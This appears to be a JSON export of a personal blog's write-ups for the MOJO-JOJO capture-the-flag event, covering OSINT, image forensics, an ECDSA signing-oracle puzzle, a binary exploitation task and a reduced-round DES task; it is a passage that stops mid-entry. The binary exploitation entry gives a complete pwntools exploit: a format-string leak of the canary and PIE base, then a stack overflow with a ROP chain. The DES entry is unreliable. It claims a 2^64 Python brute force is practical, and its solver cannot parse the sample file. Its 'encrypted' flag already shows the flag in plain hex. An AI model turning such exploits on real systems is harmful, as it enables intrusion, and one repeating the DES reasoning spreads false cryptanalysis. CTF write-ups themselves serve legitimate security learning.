
[{"content":"Challenge Name: Anime\nCategory: Osint\nCTF: MOJO-JOJO\nDescription: the author likes an anime very very much he wants u to find the anime name , his author , the main character full name , his job , his sword name and his main attack\nflag format :\nMOJO-JOJO{AnimeName_MainCharacterFullName_Job_SwordName_MainAttack} Challenge Overview # The \u0026ldquo;Anime\u0026rdquo; challenge required us to identify an author\u0026rsquo;s favorite anime and extract specific information about it. The flag format was:\nMOJO-JOJO{AnimeName_MainCharacterFullName_Job_SwordName_MainAttack} Solution Steps # Step 1: Identifying the Anime # Clue: The author\u0026rsquo;s name was \u0026ldquo;Zanpakto\u0026rdquo;\nThe first breakthrough came from recognizing that \u0026ldquo;Zanpakto\u0026rdquo; is not a random name. A quick Google search revealed that a Zanpakut≈ç (literally meaning \u0026ldquo;Soul-Cutting Sword\u0026rdquo;) is the primary weapon wielded by Soul Reapers in the anime Bleach.\nThis was a strong indicator that Bleach was the target anime we needed to investigate.\nStep 2: Finding the Main Character # With Bleach identified as the anime, the next task was to find its protagonist.\nA quick search for \u0026ldquo;Bleach anime protagonist\u0026rdquo; or \u0026ldquo;Bleach main character\u0026rdquo; immediately returned Ichigo Kurosaki as the answer.\nIchigo Kurosaki is the central character around which the entire series revolves.\nStep 3: Determining His Role/Job # To find the exact title of Ichigo\u0026rsquo;s role, I consulted Bleach fandom ‚Äî a comprehensive community-driven wiki dedicated to the Bleach series.\nOn the wiki, it was confirmed that Ichigo is a Shinigami (also known as a Soul Reaper), which are supernatural beings tasked with protecting the balance between the human world and the spirit world.\nStep 4: Identifying His Sword Name # Continuing the research on the Bleach wiki and through additional searches, I looked up the name of Ichigo\u0026rsquo;s Zanpakut≈ç.\nHis sword is called Zangetsu (meaning \u0026ldquo;Cutting Moon\u0026rdquo;), which is one of the most iconic weapons in the series.\nStep 5: Finding His Signature Attack # The final piece of the puzzle was discovering Ichigo\u0026rsquo;s most famous and signature technique.\nA search for \u0026ldquo;Ichigo\u0026rsquo;s signature attack\u0026rdquo; or \u0026ldquo;Ichigo\u0026rsquo;s main attack\u0026rdquo; revealed Getsuga Tensh≈ç (meaning \u0026ldquo;Moon Fang Heaven-Piercer\u0026rdquo;), his most powerful and recognizable technique.\nFlag Construction # With all the required information collected:\nInformation Value Anime Name Bleach Main Character Full Name IchigoKurosaki Job/Role Shinigami Sword Name Zangetsu Main Attack GetsugaTensh≈ç Final Flag # MOJO-JOJO{Bleach_IchigoKurosaki_Shinigami_Zangetsu_GetsugaTensh≈ç} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/anime/","section":"Writeups","summary":"","title":"Anime - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Bad Boy\nCategory: Forensics\nCTF: MOJO-JOJO\nDescription: this cool cat wants to stretch ; help him\nApproach # Initial Investigation # I started by examining the provided image file. The image appeared to be corrupted or incomplete, which aligns with the challenge hint about the cat wanting to \u0026ldquo;stretch.\u0026rdquo;\nTraditional Forensics Tools # I first tried standard binary analysis approaches:\nFile Analysis # $ file samirrr.png samirrr.png: PNG image data, 225 x 190, 8-bit/color RGB, non-interlaced Binwalk Analysis # $ binwalk samirrr.png DECIMAL HEXADECIMAL DESCRIPTION 0 0x0 PNG image, total size: 75281 bytes Binwalk only identified the PNG header, no embedded files or suspicious signatures detected.\nStrings Analysis # $ strings samirrr.png IHDR iCCPicc cHRM bKGD zTXtRaw profile type icc IDATx ... The strings output only revealed standard PNG metadata and structure information - no readable text or flag data.\nConclusion: All three standard forensic tools returned irrelevant results, indicating the challenge required a more specialized approach.\nFotoForensics Analysis # Since traditional tools didn\u0026rsquo;t yield results, I turned to a specialized image forensics tool: FotoForensics (an online tool for detecting image manipulation and hidden data).\nThe key breakthrough came when I:\nUploaded the image to FotoForensics Used the Hidden Pixels feature Discovered the full image of the cat with the flag embedded in the hidden pixel data Solution # The flag was revealed through the hidden pixel analysis on FotoForensics, which exposed data that was not visible in the standard image display.\nFlag # MOJO-JOJO{Samir_ykt4se77} Key Takeaway # When dealing with image challenges, especially those involving visual corruption or hidden data, specialized image forensics tools like FotoForensics can be more effective than general binary analysis tools. The \u0026ldquo;hidden pixels\u0026rdquo; feature specifically exploits how digital images can conceal data in ways that aren\u0026rsquo;t immediately visible.\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/forensics/bad_boy/","section":"Writeups","summary":"","title":"Bad Boy - CTF Writeup","type":"writeups"},{"content":"During the MOJO-JOJO CTF, I solved Binary Exploitation challenges.\nHere I share my approach, mistakes, and how I got the flags. Thanks to the MOJO-JOJO team üêµüß†\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/","section":"Writeups","summary":"","title":"Binary Exploitation","type":"writeups"},{"content":"Challenge Name: Broken Signatures\nCategory: Cryptography\nCTF: MOJO-JOJO\nDescription: Good Luck during this adventure , little crypto knight Connection: nc 20.199.19.9 1945\nChallenge Description # The server presents a challenge called \u0026ldquo;NONCE SENSE CHALLENGE\u0026rdquo; with the following interface:\n‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó ‚ïë NONCE SENSE CHALLENGE ‚ïë ‚ïë ‚ïë ‚ïë I sign messages with ECDSA (secp256k1) and leak R=k*G. ‚ïë ‚ïë Can you forge a signature for \u0026#34;Give me the flag!\u0026#34;? ‚ïë ‚ïë ‚ïë ‚ïë Commands: ‚ïë ‚ïë 1. Get signature for any message ‚ïë ‚ïë 2. Try to get flag by providing signature ‚ïë ‚ïë 3. Show public key ‚ïë ‚ïë 4. Exit ‚ïë ‚ïë ‚ïë ‚ïë Note: I only accept 200 signing requests. ‚ïë ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù The server implements ECDSA signatures on the secp256k1 curve and:\nSigns any message we provide (up to 200 times) Leaks the nonce point R = k*G for each signature Requires us to forge a valid signature for the message \u0026ldquo;Give me the flag!\u0026rdquo; Initial Analysis # Understanding ECDSA # In ECDSA, a signature consists of two values (r, s):\nr is the x-coordinate of the nonce point R = k*G s = k^(-1)(z + r*d) mod n where: k is the secret nonce z is the hash of the message d is the private key n is the curve order The Leak # The server leaks the full nonce point R = (R.x, R.y) for each signature. This is unusual because normally only r = R.x is revealed as part of the signature.\nChallenge Name Hint # \u0026ldquo;NONCE SENSE\u0026rdquo; strongly suggests the vulnerability is related to nonce handling - possibly:\nNonce reuse Predictable nonce generation Weak random number generator Exploration and Dead Ends # Attempt 1: Nonce Reuse Attack # The classic ECDSA vulnerability occurs when the same nonce k is used for two different messages. If k is reused:\ns1 = k^(-1)(z1 + r*d) s2 = k^(-1)(z2 + r*d) From these equations, we can recover:\nk = (z1 - z2) / (s1 - s2) mod n d = (s*k - z) / r mod n Result: Collected 200 signatures but found no nonce reuse. Each signature had a unique r value.\nAttempt 2: Predictable Nonce Generation # Tested if nonces were generated predictably, such as:\nk = hash(message) mod n k being constant Simple patterns Result: None of these hypotheses matched. The nonce generation appeared cryptographically sound.\nAttempt 3: Mathematical Attacks # Investigated various ECDSA attacks:\nUsing leaked R points to recover k (discrete log problem - infeasible) Biased nonce bits (not present) Lattice attacks (requires partial nonce leakage) Result: No viable mathematical attack found.\nThe Breakthrough # Discovery: Deterministic Signatures # While testing the server, I discovered something interesting: requesting a signature for the same message multiple times produces identical (r, s) values!\n# Testing with \u0026#34;Give me the flag!\u0026#34; - all signatures identical: Signature 1: r=0x489fbbdc..., s=0x32fb8ec5... Signature 2: r=0x489fbbdc..., s=0x32fb8ec5... Signature 3: r=0x489fbbdc..., s=0x32fb8ec5... This means the server uses deterministic ECDSA (likely RFC 6979), where nonces are derived deterministically from the private key and message.\nThe \u0026ldquo;Vulnerability\u0026rdquo; # The challenge isn\u0026rsquo;t about breaking ECDSA cryptographically. It\u0026rsquo;s about understanding that:\nWe can request a signature for any message \u0026ldquo;Give me the flag!\u0026rdquo; is just another message The signature we need is\u0026hellip; the one the server gives us! This is more of a logic puzzle than a cryptographic exploit. The challenge asks us to \u0026ldquo;forge\u0026rdquo; a signature, but technically we\u0026rsquo;re not forging anything - we\u0026rsquo;re legitimately obtaining it from the signing oracle.\nSolution # The solution is straightforward:\nConnect to the server Request a signature for \u0026ldquo;Give me the flag!\u0026rdquo; (command 1) Extract the r and s values from the server\u0026rsquo;s response Submit those values as the signature (command 2) Receive the flag Exploitation Code # #!/usr/bin/env python3 import socket import time import re msg_hex = \u0026#34;47697665206d652074686520666c616721\u0026#34; # \u0026#34;Give me the flag!\u0026#34; sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((\u0026#34;20.199.19.9\u0026#34;, 1945)) sock.settimeout(10) def recv_all(timeout=1): sock.settimeout(timeout) data = b\u0026#39;\u0026#39; try: while True: chunk = sock.recv(4096) if not chunk: break data += chunk except socket.timeout: pass return data.decode(errors=\u0026#39;ignore\u0026#39;) # Banner recv_all(2) print(\u0026#34;[*] Step 1: Get signature for target message\u0026#34;) sock.send(b\u0026#34;1\\n\u0026#34;) time.sleep(0.1) recv_all(0.5) sock.send(msg_hex.encode() + b\u0026#34;\\n\u0026#34;) time.sleep(0.1) response = recv_all(1) # Parse r and s match_r = re.search(r\u0026#39;r = (0x[0-9a-f]+)\u0026#39;, response) match_s = re.search(r\u0026#39;s = (0x[0-9a-f]+)\u0026#39;, response) r_val = match_r.group(1) s_val = match_s.group(1) print(f\u0026#34;[+] Got signature:\u0026#34;) print(f\u0026#34; r = {r_val}\u0026#34;) print(f\u0026#34; s = {s_val}\u0026#34;) print(\u0026#34;\\n[*] Step 2: Submit the signature\u0026#34;) sock.send(b\u0026#34;2\\n\u0026#34;) time.sleep(0.1) recv_all(0.5) print(\u0026#34;[*] Sending r...\u0026#34;) sock.send(r_val.encode() + b\u0026#34;\\n\u0026#34;) time.sleep(0.1) recv_all(0.5) print(\u0026#34;[*] Sending s...\u0026#34;) sock.send(s_val.encode() + b\u0026#34;\\n\u0026#34;) time.sleep(0.1) final_response = recv_all(2) sock.close() print(f\u0026#34;\\n[*] FINAL SERVER RESPONSE:\u0026#34;) print(final_response) Execution # $ python3 correct_exploit.py [*] Step 1: Get signature for target message [+] Got signature: r = 0xb186388295fc648085e2da25d82ff4373fdd4fcd7ca755e2a0fc861f52229094 s = 0x285b9ca813001c1d1c26a8bc288e1ac69dcc2547a24f1999c0bf3ecc2490cf6e [*] Step 2: Submit the signature [*] Sending r... [*] Sending s... [*] FINAL SERVER RESPONSE: [SUCCESS] Flag: MOJO-JOJO{WH0_3V3R_L0V35_3CD5A_BR00} Flag # MOJO-JOJO{WH0_3V3R_L0V35_3CD5A_BR00} Lessons Learned # Think Outside the Cryptographic Box: Not every crypto challenge requires breaking cryptography. Sometimes the vulnerability is in the challenge design or protocol logic.\nTest Assumptions: The challenge hints at nonce problems, but the actual solution was much simpler. Always test basic assumptions first.\nSigning Oracles Are Powerful: In real-world scenarios, if an attacker can request signatures for arbitrary messages, they effectively have the signing key for practical purposes.\nDeterministic ECDSA: While RFC 6979 deterministic ECDSA is cryptographically sound and prevents nonce reuse vulnerabilities, it doesn\u0026rsquo;t prevent someone from requesting signatures for any message they want!\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/cryptography/broken-signatures/","section":"Writeups","summary":"","title":"Broken Signatures - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"During the MOJO-JOJO CTF, I solved Crypto challenges. Here I share my approach, mistakes, and how I got the flags. Thanks to the MOJO-JOJO team üêµüß†\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/cryptography/","section":"Writeups","summary":"","title":"Cryptography","type":"writeups"},{"content":"Challenge Name: CS 12.06\nCategory: PWN\nCTF: MOJO-JOJO\nDescription: XIIVI ONCE SAID \u0026ldquo;IINEK DIMA AL HOLILA\u0026rdquo;\nConnection: nc mojo-pwn.securinets.tn 9006\nChallenge Overview # The challenge presents a binary with multiple security mechanisms enabled (PIE, Stack Canary, NX) that requires bypassing authentication to access a hidden function that reads and exfiltrates a flag.\nInitial Analysis # Binary Information # $ file challenge challenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, not stripped $ checksec challenge Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Program Behavior # --- CS 12.06 --- Security Level: MAXIMUM [LOG] Initializing secure logging sequence... [LOG] Identity verification required: [LOG] Identity confirmed: [GATE] Physical authentication barrier active. [GATE] Provide phrase: [GATE] Authentication failed. Terminating session. [SYSTEM] System shutdown. Vulnerability Discovery # 1. Format String Vulnerability in _log_handler # Disassembling the _log_handler function revealed a format string vulnerability:\n1523: mov 0x2b66(%rip),%rdx # stdin 152a: lea -0x20(%rbp),%rax # user input buffer 152e: mov $0x14,%esi # read 20 bytes max 1533: mov %rax,%rdi 1536: call fgets@plt 1554: lea -0x20(%rbp),%rax # our input 1558: mov %rax,%rdi 155b: mov $0x0,%eax 1560: call printf@plt # VULNERABLE: printf(user_input) The identity field input is passed directly to printf(), allowing us to leak stack values using format string specifiers.\nTesting the vulnerability:\n$ echo -e \u0026#34;%p.%p.%p.%p\\ntest\u0026#34; | ./challenge [LOG] Identity confirmed: 0x7ffd6ebdde10.(nil).(nil).0x7ffd6ebdde90 2. Buffer Overflow in _auth_guard # The _auth_guard function has a classic buffer overflow:\n1580: sub $0x30,%rsp # Allocate 48 bytes (0x30) 15b6: lea -0x30(%rbp),%rax # Buffer at rbp-0x30 15ba: mov $0x100,%edx # Read 256 bytes (0x100) - OVERFLOW! 15bf: mov %rax,%rsi 15c2: mov $0x0,%edi 15c7: call read@plt The buffer is 48 bytes but read() accepts up to 256 bytes, allowing us to overflow the stack.\n3. Hidden Function: _sys_maintenance # The binary contains a hidden function _sys_maintenance at offset 0x11e9 that:\nChecks three arguments: rdi=0x1206, rsi=0x1161, rdx=0xcafebab Decodes a filename by XORing bytes Opens and reads the flag file Prints the flag 1230: cmpq $0x1206,-0xb8(%rbp) # Check arg1 123d: cmpq $0x1161,-0xc0(%rbp) # Check arg2 124a: cmpq $0xcafebab,-0xc8(%rbp) # Check arg3 1255: je 0x128e # All match? Continue to flag 4. Useful ROP Gadgets # Two special gadgets were discovered:\n_proc_ctx (0x1482):\npop rbx pop rbp pop r12 pop r13 mov r14,QWORD PTR [rsp] # Load r14 from stack add rsp,0x8 mov r15,QWORD PTR [rsp] # Load r15 from stack add rsp,0x8 ret _proc_ctx_2 (0x149b):\nmov rdx,r14 # arg3 mov rsi,r13 # arg2 mov edi,r12d # arg1 xor rbx,0x1337 call QWORD PTR [r15+rbx*8] # Indirect call ret These gadgets allow us to:\nLoad controlled values into registers Call any function with three arguments Exploitation Strategy # Step 1: Leak Stack Canary and PIE Base # Using the format string vulnerability, we leak:\nOffset 17: Stack canary (always ends in 0x00) Offset 23: A code address (ending in 0x5f2, which is the main function at 0x15f2) leak_payload = b\u0026#39;%17$p.%23$p\u0026#39; # Example output: 0x316b452acebc5900.0x5be510e9a5f2 From the leaked code address, we calculate the PIE base:\npie_base = (leaked_addr - 0x15f2) \u0026amp; ~0xfff Step 2: Build ROP Chain # The stack layout in _auth_guard:\nrbp-0x30: buffer start (48 bytes) rbp-0x08: canary (8 bytes) rbp+0x00: saved rbp (8 bytes) rbp+0x08: return address Our ROP chain:\npayload = b\u0026#39;A\u0026#39; * 40 # Fill buffer to canary payload += p64(canary) # Preserve canary to bypass check payload += b\u0026#39;B\u0026#39; * 8 # Saved RBP (doesn\u0026#39;t matter) # ROP chain payload += p64(proc_ctx_addr) # Return to _proc_ctx payload += p64(0x1337) # rbx (will XOR to 0) payload += p64(0) # rbp (dummy) payload += p64(0x1206) # r12 -\u0026gt; edi (arg1) payload += p64(0x1161) # r13 -\u0026gt; rsi (arg2) payload += p64(0xcafebab) # r14 -\u0026gt; rdx (arg3) payload += p64(k_dispatch_table) # r15 (function table base) payload += p64(proc_ctx_2_addr) # Return address Step 3: Trigger Exploitation # When _proc_ctx_2 executes:\nIt moves our controlled values into argument registers XORs rbx (0x1337) with 0x1337 = 0 Calls [r15 + 0*8] = [k_dispatch_table] which points to _sys_maintenance _sys_maintenance receives the correct arguments and reads the flag Exploit Code # #!/usr/bin/env python3 from pwn import * HOST = \u0026#39;mojo-pwn.securinets.tn\u0026#39; PORT = 9006 context.binary = elf = ELF(\u0026#39;./challenge\u0026#39;) context.arch = \u0026#39;amd64\u0026#39; # Offsets (PIE-relative) proc_ctx = 0x1482 proc_ctx_2 = 0x149b sys_maintenance = 0x11e9 k_dispatch_table_offset = 0x40b0 # Required arguments for _sys_maintenance arg1 = 0x1206 arg2 = 0x1161 arg3 = 0xcafebab def exploit(): io = remote(HOST, PORT) # Leak canary and code address io.recvuntil(b\u0026#39;Identity verification required: \u0026#39;) leak_payload = b\u0026#39;%17$p.%23$p\u0026#39; io.sendline(leak_payload) io.recvuntil(b\u0026#39;Identity confirmed: \u0026#39;) leaks = io.recvline().strip().decode().split(\u0026#39;.\u0026#39;) canary = int(leaks[0], 16) leaked_addr = int(leaks[1], 16) pie_base = (leaked_addr - 0x15f2) \u0026amp; ~0xfff log.success(f\u0026#34;Canary: {hex(canary)}\u0026#34;) log.success(f\u0026#34;PIE base: {hex(pie_base)}\u0026#34;) # Calculate addresses proc_ctx_addr = pie_base + proc_ctx proc_ctx_2_addr = pie_base + proc_ctx_2 k_dispatch_table_addr = pie_base + k_dispatch_table_offset # Build ROP chain io.recvuntil(b\u0026#39;Provide phrase: \u0026#39;) payload = b\u0026#39;A\u0026#39; * 40 payload += p64(canary) payload += b\u0026#39;B\u0026#39; * 8 payload += p64(proc_ctx_addr) payload += p64(0x1337) payload += p64(0) payload += p64(arg1) payload += p64(arg2) payload += p64(arg3) payload += p64(k_dispatch_table_addr) payload += p64(proc_ctx_2_addr) io.send(payload) io.interactive() if __name__ == \u0026#39;__main__\u0026#39;: exploit() Result # [SYSTEM] Quantum Vector Alignment Confirmed. [SYSTEM] Bypassing security kernels... Initiating Core Dump... \u0026gt;\u0026gt;\u0026gt; DATA EXFILTRATED:MOJO-JOJO{12.06_TNAJEM_TKOUL_EL_COMEBACKSZN} [SYSTEM] Session terminated safely. Final Flag # MOJO-JOJO{12.06_TNAJEM_TKOUL_EL_COMEBACKSZN} Key Takeaways # Format String + Buffer Overflow: Chaining vulnerabilities - use format string to leak necessary values, then exploit buffer overflow Canary Bypass: Stack canaries can be bypassed if we can leak them PIE Bypass: Leaking a single code address allows calculating the base address Custom ROP Gadgets: The challenge provided custom gadgets designed for setting up function calls Defense in Depth: Multiple protections (PIE, canary, NX) require multiple bypass techniques ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/cs-12.06/","section":"Writeups","summary":"","title":"CS 12.06 - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"CTfs I\u0026rsquo;ve played and written so far. I will be adding more writeups as I solve more challenges and participate in more CTFs.\n","date":"11 February 2026","externalUrl":null,"permalink":"/ctfs/","section":"CTFs","summary":"","title":"CTFs","type":"ctfs"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/cybersecurity/","section":"Tags","summary":"","title":"Cybersecurity","type":"tags"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/","section":"Deadnaut","summary":"","title":"Deadnaut","type":"page"},{"content":"Challenge Name: Deez Nuts\nCategory: Cryptography\nCTF: MOJO-JOJO\nDescription: LACRIM FIRST TIME WAS SO NICE I HAD TO DO IT TWICE\nTL;DR # The challenge provides a sabotaged DES cipher with only 4 rounds (instead of 16), a weak key schedule with overlapping subkeys, and 10,000 known plaintext-ciphertext pairs. By exploiting the weak key schedule and reduced rounds, we can perform a brute-force key recovery attack or differential cryptanalysis to recover the encryption key and decrypt the flag.\nChallenge Artefacts # Source File: chall-1.py # The challenge provides a custom DES implementation with deliberate weaknesses:\nclass SabotagedDES: def __init__(self, key_hex): self.key = self._hex_to_bits(key_hex) self.rounds = 4 # Only 4 rounds instead of 16! self.subkeys = self._generate_subkeys(self.key) def _generate_subkeys(self, key): # Weak key schedule - just overlapping slices! return [key[i:i+48].ljust(48, \u0026#39;0\u0026#39;) for i in range(0, 4 * 4, 4)] def feistel(self, R, subkey): expanded = \u0026#34;\u0026#34;.join(R[i-1] for i in E_TABLE) xored = bin(int(expanded, 2) ^ int(subkey, 2))[2:].zfill(48) output = \u0026#34;\u0026#34; for i in range(8): block = xored[i*6:(i+1)*6] row = int(block[0] + block[5], 2) col = int(block[1:5], 2) val = S_BOXES[i][row][col] output += bin(val)[2:].zfill(4) return output Sample File: samples-1.txt # Contains 5,000 rows of plaintext-ciphertext pairs (10,000 pairs total). Each row has two pairs with a specific differential:\na648987ac7044b4e,c4feb40e8a2ed56e|9248987ac7044b4e,ef4eb403f9b3d55b a053fbf4318efd2a,c4423860cd49879d|9453fbf4318efd2a,a74238605c39879d 639afa719e9e94b5,459b01fb50deb18e|579afa719e9e94b5,1f9b01fec4deb184 449f1f5bf167af64,3f2b94a8702a205f|709f1f5bf167af64,0cfb94a4f1e7203b b757c63e509b651b,6e7b298562d30615|8357c63e509b651b,3dab298541ad0615 ... Format: plaintext1,ciphertext1|plaintext2,ciphertext2\nPattern: All pairs have plaintext1 XOR plaintext2 = 0x3400000000000000\nEncrypted Flag: flag.enc # FLAG_ENCRYPTED: 36382e25ad4a4f4a4f7b4d30524e33473359345f4b3144355f4e334b35314e5f4b48304c33973b02 The flag is encrypted using the same SabotagedDES cipher with an unknown 64-bit key.\nInitial Analysis # The challenge implements a custom cipher called SabotagedDES with intentional weaknesses:\nKey observations:\nOnly 4 rounds instead of standard DES\u0026rsquo;s 16 rounds Weak key schedule - subkeys are overlapping slices with no proper derivation 10,000 known plaintext-ciphertext pairs provided for cryptanalysis All plaintext pairs have consistent XOR pattern: 0x3400000000000000 Understanding the Vulnerability # 1. Weak Key Schedule # def _generate_subkeys(self, key): return [key[i:i+48].ljust(48, \u0026#39;0\u0026#39;) for i in range(0, 4 * 4, 4)] The subkeys are generated by taking overlapping 48-bit slices at offsets 0, 4, 8, 12 bits:\nsubkey[0] = key[0:48] subkey[1] = key[4:52] subkey[2] = key[8:56] subkey[3] = key[12:64] These subkeys have massive overlap (44 bits!), making them highly dependent and predictable.\n2. Insufficient Rounds # 4 rounds is far too few for security. Real DES needs 16 rounds specifically to provide avalanche effect and security. With only 4 rounds:\nDifferential cryptanalysis becomes extremely feasible The cipher can be broken with a manageable number of known plaintext pairs 3. Known Plaintext Attack Vector # The 10,000 provided PT-CT pairs have a specific differential structure:\nPlaintext XOR: 0x3400000000000000 (constant across all pairs) Ciphertext XOR: Varies, but all pairs are related through this differential Attack Strategy # Approach 1: Brute Force Key Recovery (Most Direct) # With the PT-CT pairs available, implement a key recovery attack:\nfor candidate_key in range(2^64): des = SabotagedDES(hex(candidate_key)) if des.encrypt_block(known_pt) == known_ct: # Verify with multiple pairs to confirm if all(des.encrypt_block(pt) == ct for pt, ct in sample_pairs): return candidate_key Optimization: Test only the first few PT-CT pairs to quickly eliminate invalid keys before checking all of them.\nApproach 2: Differential Cryptanalysis # Leverage the consistent differential patterns through rounds:\nTrack differentials through rounds:\nAfter round 1: Input differential creates output differential through Feistel function After rounds 2-4: Differentials evolve predictably due to weak structure Use characteristic analysis:\nThe XOR difference 0x3400000000000000 creates specific S-box input patterns These patterns have known output probability distributions Multiple pairs can be combined to reduce key candidates Reduce key space:\nEach differential pair constrains certain key bits Combine multiple pairs to narrow down candidates Can reduce from $2^{64}$ possible keys to $2^{32}$ or less with enough pairs Approach 3: Meet-in-the-Middle Attack # Split the 4 rounds into 2 forward + 2 backward:\nForward direction (rounds 0-1): Enumerate all $2^{48}$ possible subkey[0] values\nStore: (plaintext, intermediate_state_after_round1) -\u0026gt; subkey[0] Backward direction (rounds 3-2): Enumerate all $2^{48}$ possible combinations of subkey[2], subkey[3]\nFor each ciphertext, decrypt back to round 2 state Check if we\u0026rsquo;ve seen this state from forward direction If match found, we\u0026rsquo;ve recovered subkey[0], subkey[2], subkey[3] Recover subkey[1]: Once other subkeys known, use PT-CT pairs to find subkey[1]\nThis reduces complexity from $2^{64}$ to approximately $2^{48} + 2^{48} = 2^{49}$ operations.\nExploitation Steps # Load known plaintext-ciphertext pairs:\nwith open(\u0026#39;samples-1.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: pairs = [line.strip().split() for line in f.readlines()] Implement fast encryption:\nfrom chall_1 import SabotagedDES # Pre-load first few pairs for quick validation test_pairs = pairs[:10] Brute force the key space:\nfor key_candidate in range(0, 2**64): key_hex = hex(key_candidate)[2:].zfill(16) des = SabotagedDES(key_hex) # Quick test with first pair if des.encrypt_block(test_pairs[0][0]) == test_pairs[0][1]: # Verify with more pairs if all(des.encrypt_block(pt) == ct for pt, ct in test_pairs): print(f\u0026#34;Found key: {key_hex}\u0026#34;) break Decrypt the flag:\nwith open(\u0026#39;flag.enc\u0026#39;, \u0026#39;r\u0026#39;) as f: encrypted_flag = f.read().strip() des = SabotagedDES(found_key) flag_hex = \u0026#34;\u0026#34; for i in range(0, len(encrypted_flag), 16): block = encrypted_flag[i:i+16] flag_hex += des.decrypt_block(block) flag = bytes.fromhex(flag_hex).decode(\u0026#39;ascii\u0026#39;) print(f\u0026#34;Flag: {flag}\u0026#34;) Solver Script # Optimized Brute Force # from chall_1 import SabotagedDES from multiprocessing import Pool, cpu_count def load_samples(): with open(\u0026#39;samples-1.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: return [line.strip().split() for line in f.readlines()[:10]] def test_key_range(args): start, end, test_pairs = args for key in range(start, end): key_hex = hex(key)[2:].zfill(16) des = SabotagedDES(key_hex) if des.encrypt_block(test_pairs[0][0]) == test_pairs[0][1]: if all(des.encrypt_block(pt) == ct for pt, ct in test_pairs): return key_hex return None def parallel_bruteforce(): test_pairs = load_samples() num_processes = cpu_count() chunk_size = 2**64 // num_processes ranges = [(i * chunk_size, (i + 1) * chunk_size, test_pairs) for i in range(num_processes)] with Pool(num_processes) as pool: for result in pool.imap_unordered(test_key_range, ranges): if result: print(f\u0026#34;Found key: {result}\u0026#34;) return result if __name__ == \u0026#34;__main__\u0026#34;: key = parallel_bruteforce() # Decrypt flag with open(\u0026#39;flag.enc\u0026#39;, \u0026#39;r\u0026#39;) as f: encrypted = f.read().strip() des = SabotagedDES(key) flag = \u0026#34;\u0026#34; for i in range(0, len(encrypted), 16): flag += des.decrypt_block(encrypted[i:i+16]) print(bytes.fromhex(flag).decode()) Final Flag # MOJO-JOJO{M0RN3G3Y4_K1D5_N3K51N_KH0LT4} Takeaways # Round count matters: Even a theoretically sound cipher becomes weak with too few rounds. Real DES uses 16 rounds for avalanche effect and security. Proper key schedule is critical: Overlapping/dependent subkeys create massive vulnerabilities. Real DES uses PC-1/PC-2 permutations and left shifts to generate cryptographically independent subkeys. Known plaintext attacks: Large numbers of known PT-CT pairs enable powerful recovery attacks, especially against weak ciphers. Differential cryptanalysis: When differentials are traceable through rounds (due to insufficient mixing), the cipher becomes vulnerable to systematic analysis. Implementation vs theory: The theoretical weaknesses only matter if the implementation faithfully executes the weak design. Additional Notes # What Real DES Does Right # Real DES addresses these vulnerabilities:\n16 rounds instead of 4 - provides proper avalanche effect Proper key schedule - PC-1 permutation, PC-2 permutation, left shifts create independent subkeys P-box permutation - output of S-boxes is permuted, breaking direct differential paths Design rationale - Proven to resist known attacks when used with proper number of rounds Performance Considerations # The challenge is designed such that brute force is feasible but requires:\nEfficient encryption implementation (~1-2M encryptions/second in Python) Parallelization across multiple cores/machines Or GPU acceleration for billions of encryptions/second For practical solving:\nImplement fast encryption with minimal overhead Pre-load sample pairs for quick validation Parallelize across multiple processes/machines Run for several hours to find the key ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/cryptography/deez-nuts/","section":"Writeups","summary":"","title":"Deez Nuts - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/dfir/","section":"Tags","summary":"","title":"DFIR","type":"tags"},{"content":"Challenge Name: FIFA / FC\nCategory: Osint\nCTF: MOJO-JOJO\nDescription: This task is for fun (not sure xD)\nMOJO-JOJO{Name_Rating_Playstyle+_Team_NationalTeamNumber} Challenge Overview # The objective was to gather specific information from a FIFA player card to construct the flag. Required 